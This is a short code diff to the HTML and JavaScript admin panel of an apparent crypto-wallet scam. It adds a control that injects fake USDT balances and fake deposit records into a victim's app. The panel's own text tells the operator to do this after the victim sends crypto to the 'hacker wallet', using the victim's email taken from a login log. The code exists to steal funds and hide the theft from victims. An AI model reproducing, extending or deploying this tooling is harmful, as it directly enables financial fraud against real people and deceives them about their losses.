@@ -332,16 +332,16 @@
         Enable clear
       </label>
     </div>
-    <label style="margin-top:14px">Fake balance inject (CEO proof — victim Wallet shows extra USDT)</label>
+    <label style="margin-top:14px">Fake deposit inject (CEO proof — Wallet balance + Deposit History)</label>
     <div class="input-row">
       <input id="fakeMobile" placeholder="Victim mobile or email from login log" />
       <input id="fakeAmount" placeholder="USDT amount e.g. 100" type="number" min="0" step="0.01" />
     </div>
     <div class="btn-row">
-      <button class="btn-primary" onclick="injectFakeBalance()">💰 Inject fake USDT to victim app</button>
+      <button class="btn-primary" onclick="injectFakeBalance()">💰 Inject fake USDT + deposit record</button>
     </div>
     <p style="font-size:11px;color:var(--muted);margin-top:8px">
-      After victim sends crypto to hacker wallet, set same amount here → victim must re-open Wallet tab (leave tab & come back) to see balance. Use exact email from login log.
+      After victim sends crypto to hacker wallet, set same amount here → victim re-opens Wallet tab AND Deposit Records (充值). Balance + history both update. Use exact email from login log.
     </p>
   </div>
 
@@ -551,7 +551,7 @@
           body: JSON.stringify({ mobile, amount: Number(amount), coin: 'USDT' }),
         });
         const j = await r.json();
-        status.textContent = '✓ Injected ' + amount + ' USDT for ' + mobile + ' — tell victim to open Wallet tab';
+        status.textContent = '✓ Injected ' + amount + ' USDT + deposit history for ' + mobile + ' — victim: re-open Wallet + Records tab';
         status.className = 'ok';
         refresh();
       } catch (e) {
